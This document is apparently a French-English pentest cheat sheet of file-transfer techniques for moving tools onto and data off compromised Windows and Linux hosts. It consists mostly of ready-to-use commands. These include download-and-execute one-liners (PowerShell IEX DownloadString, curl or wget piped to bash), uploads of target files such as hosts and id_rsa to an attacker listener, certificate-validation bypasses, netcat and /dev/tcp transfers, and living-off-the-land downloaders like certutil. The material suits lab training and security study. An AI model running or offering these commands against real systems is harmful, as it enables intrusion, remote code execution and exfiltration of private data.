# File Transfert

----

## Windows File Transfer Methods

###### BASE64 : 
* Encoder en base 64 , puis copier et décoder sur la cible
* checker la validité avec le hash match

###### Powershell :

```powershell
###### base64 method : 
# encode file in base64
cat <FileName> |base64 -w 0;echo 
# decode 
echo -n "<Base64>" | base64 -d > <FileName>
# decode 
[IO.File]::WriteAllBytes("<C:\Users\Public\id_rsa | NewPath>", [Convert]::FromBase64String("<Base64>"))


# file downlod method
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
# file download method 2
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# download string method
# download string and execute it directly
 IEX (New-Object Net.WebClient).DownloadString('<fileUrlLink>')
# ou
 (New-Object Net.WebClient).DownloadString('<fileUrlLink>') | IEX


# invoke web-request
Invoke-WebRequest <FileUrlLink> -OutFile <OutputName>
# bypasser les erreur de parsing
Invoke-WebRequest <FileUrlLink> -UseBasicParsing | IEX

#bypasser le certificat auth ssl/tls
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```
Powershell Uploads

```bash 
# install dependance
pip3 install uploadserver
# create le serveur
python3 -m uploadserver

# upload or run with IEX

#Upload
Invoke-FileUpload -Uri http://<AttaquantURL>:<8000 | the port >/upload -File <C:\Windows\System32\drivers\etc\hosts |file path>
#IEX
IEX(New-Object Net.WebClient).DownloadString('<FileURL>')

# upload with base64
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<C:\Windows\System32\drivers\etc\hosts | FilePath >' -Encoding Byte))
#action
Invoke-WebRequest -Uri http://<AttaquantURL>:<PORT>/ -Method POST -Body $b64
# chez l'attaquant : listenning
nc -lvnp <Port>

```

###### SMB
 - SMB (Server Message Block) Protocol run on Port 445 

```bash
# creation d'un serveur SMB sur la machine de l'attaquant 
sudo impacket-smbserver share -smb2support /tmp/smbshare
# téléchargement sur la machine cible
copy \\<AttaquantIP>\share\<Filename>

#bypasser authentification
# sur la machine de l'attaquant
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <CustomUser> -password <CustomPass>
# sur la machine distante
net use n: \\<AttaquantIP>\share /user:<CustomUser> <CustomPass>


# enumerate shares in smb 
smbclient -N -L \\\\<IP Address>
# se connecter en tant qu'utilisateur
smbclient -U <Username> \\\\<IP Address>\\<Sharename>

```

- SMB Upload
```bash
# install dépendance
sudo pip install wsgidav cheroot
# use smb server
sudo wsgidav --host=0.0.0.0 --port=<80 | PORT> --root=/tmp --auth=anonymous
# chez la cible ( powershell)
dir \\<AttaquantIP>\DavWWWRoot

# upload de la cible vers l'attaquant
copy <C:\Users\john\Desktop\SourceCode.zip | FilePath> \\<IP>\DavWWWRoot\

```


###### FTP

```bash
# installer les dépendances
sudo pip3 install pyftpdlib
# specifier le port 21 car par défaut c'est le port 2121
sudo python3 -m pyftpdlib --port 21
# se connecter sur l'attaquant avec la cible
(New-Object Net.WebClient).DownloadFile('ftp://<AttaquantIP>/<FileName>', '<FileNameOnTarget>')
```

* ftp upload

```bash
# allow upload with --write
sudo python3 -m pyftpdlib --port 21 --write
# on target powershell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/<FileName>', '<C:\Windows\System32\drivers\etc\hosts | FilePath>')

```

----

## Linux File Transfer Methods

#### Méthode classique
###### Base 64 : décode or encode + md5sum to check validation

###### wget 

###### curl

#### filess operation tools

``` bash
# curl
curl <LinkDownload> | <bash | python3 | ... >

# wget 
wget -qO- <LinkDownload> | <bash | python3 | ... >
```

#### others

###### Bash

```bash
# connect with bash
exec 3<>/dev/tcp/<TargetIP>/<Port | 80>
# send get request
echo -e "GET /<FileName> HTTP/1.1\n\n">&3
# get response
cat <&3
```

###### SSH

```bash
# autoriser les serveur ssh
sudo systemctl enable ssh 

# commencer
sudo systemctl start ssh
# se connecter avec scp + download file
scp <Username>@<IP>:/<FilePath> .


# unzip file
 gunzip -S .zip  <Decompress_FileName>
``` 

* ssh : SCP Upload 

```bash
scp <FilePathOnMyLaptop> <UserName>@<CibleIP>:/<PathOnTargetLaptop>
```

###### WEB SERVER upload

```bash
#install and use
python3 -m pip install --user uploadserver
# generate certificat
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# init folder
mkdir https && cd https
# create the server
python3 -m uploadserver 443 --server-certificate /root/server.pem


# chez la target : Upload on main machine
curl -X POST https://<AttaquantIP/upload -F 'files=@<FilePath>' -F 'files=<FilePath>' --insecure

```
* autre méthode http server
```bash
python3 -m http.server
# ou
python2.7 -m SimpleHTTPServer
# ou 
php -S 0.0.0.0:<Port>
# ou 
ruby -run -ehttpd . -p<Port>

# Download the File from the Target Machine onto the Pwnbox
wget <TargetIP>:<Port>/<FilePath>
```

---

## File Transfer with code Methods
###### Telecharger un fichier en utilisant un langage de programmation

```bash
# python2
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<OutputName>")'
# python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OutPutName>")'

# php file_get_contents
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OutputName>",$file);'
# php fopen
php -r 'const BUFFER = 1024; $fremote = 
fopen("<URLPATH>", "rb"); $flocal = fopen("<OUTPUT>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
# php file pipe to bash ( exécuté en bash )
php -r '$lines = @file("<URLPATH>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

# Ruby
ruby -e 'require "net/http"; File.write("<OUTPUT>", Net::HTTP.get(URI.parse("<URL>")))'

#Perl
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT>");'

# use ( VBScript or Js ) + cscript to download file  
cscript.exe /nologo <wget.js | wget.vbs > <URL> <OutputName>
```

* js 
    ```javascript
    # wget.js
    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
    WinHttpReq.Send();
    BinStream = new ActiveXObject("ADODB.Stream");
    BinStream.Type = 1;
    BinStream.Open();
    BinStream.Write(WinHttpReq.ResponseBody);
    BinStream.SaveToFile(WScript.Arguments(1));
    ```
* vbs
    ```vbs
    # wget.vbs
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", WScript.Arguments.Item(0), False
    xHttp.Send

    with bStrm
        .type = 1
        .open
        .write xHttp.responseBody
        .savetofile WScript.Arguments.Item(1), 2
    end with
    ```

###### Upload file 
```bash
# on listenner
python3 -m uploadserver 

# on uploader
python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"files":open("<FilePath>","rb")})'
```

----

## Miscellaneous File Transfer Methods

###### Netcat
```bash
# listenner ( target )
nc -l -p <Port> > <Filename>
# specifier --recv-only : pour fermer la connexion une fois le fichier transmis 

# sender ( attaquant )
nc -v -w 2 -u <RecieverIp> -p <Port> < <Filename>
# specifier : (-q 0 | --send-only ) : pour fermer la connexion une fois le fichier transmis

### cas 2 : attaquant in listenning with file as input
# listener ( Attaquant machine )
sudo nc -l -p <Port> -q 0 < <FileName>
# reciever ( target machine )
nc <Attaquant-IP> <Port> > <FileName>


# alternative listenner
cat < /dev/tcp/<AttaquantIP/<Port> > <FileName>
# alternative sender
sudo nc -l -p <Port> -q 0 < <FileName
```

###### Living off the land 

* use gtfobin : linux
* use lolbin : windows
```powershell
# list user agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# request with chrome user agent
Invoke-WebRequest http://<IP>/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::<Chrome | name on listing> -OutFile "C:\<OutputFile>"



# living of the land
# use other binary
#Transferring File with GfxDownloadWrapper.exe
GfxDownloadWrapper.exe "http://<FileToDownloadPath>" "C:\<OutPutPath>"
# transfert with open ssl
    ## certificate creation
    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
    ## stand server in attacker machine 
    openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem <  <FilePath>
    ## compromised machine
    openssl s_client -connect 10.10.10.32:80 -quiet > <FileNameOutput>

# download file with certutil (wget )
# windows
 certutil.exe -verifyctl -split -f http://<IP>/<FileName>
```

###### Powershell Session

* Requirement : be admin

```powershell
# winRM
Test-NetConnection -ComputerName <ComputerName> -Port <Port>

# create powershell remoting session
$Session = New-PSSession -ComputerName 
<ComputerName>

# copy file from localhost to other
Copy-Item -Path C:\<File¨Path> -ToSession $Session -Destination C:\<NewPath>

# copy file from other to localhost
 Copy-Item -Path "C:\<FilePath>" -Destination C:\ -FromSession $Session
```

###### RDP ( Remote Desktop Protocol )

* Windows : **mstsc.exe**

* Linux : **xfreerdp , rdesktop**, xrdp, remmina
```bash
# linux
# mount server using rdesktop
rdesktop <IP> -d HTB -u <Username> -p '<Password>' -r disk:linux='/home/user/rdesktop/files'

#using xfreerdp
xfreerdp /v:<IP> /d:HTB /u:<Username> /p:'<Password>' /drive:linux,/home/plaintext/htb/academy/filetransfer

# how to connect : use :
\\tsclient\

# connect to rdp
sudo apt-get install rdesktop
rdesktop -u <Username> <Target-IP>
#alternative
xfreerdp /u:<Username> /p:"<Password>" /v:<Target-IP>
```


## Encryption méthods 
```powershell
# on windows to encrypt
Invoke-AESEncryption -Mode Encrypt -Key "<Password>" -Text "<Secret Text>"

# or 
Invoke-AESEncryption -Mode Encrypt -Key "<Password>" -Path | file  <FileName>

# on target host
Import-Module .\Invoke-AESEncryption.ps1

```

```bash
#encryption on linux
openssl enc -aes256 -iter 100000 -pbkdf2 -in <FileNameToEncrypt> -out <NewName>.enc

# decrypt 
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <EncryptedName> -out <DecryptedName>
```

---

## 

```bash
# Create a Directory to Handle Uploaded Files
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# Change the Owner to www-data
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Create Nginx Configuration File
# modify : /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

# Symlink our Site to the sites-enabled Directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# start server 
sudo systemctl restart nginx.service

# verify errors
tail -2 `/var/log/nginx/error.log`
ss -lnpt | grep `80`
ps -ef | grep `<PID>`

# remove config 
 sudo rm /etc/nginx/sites-enabled/default

# upload file 
curl -T <FileName> http://localhost:9001/SecretUploadDirectory/users.txt
```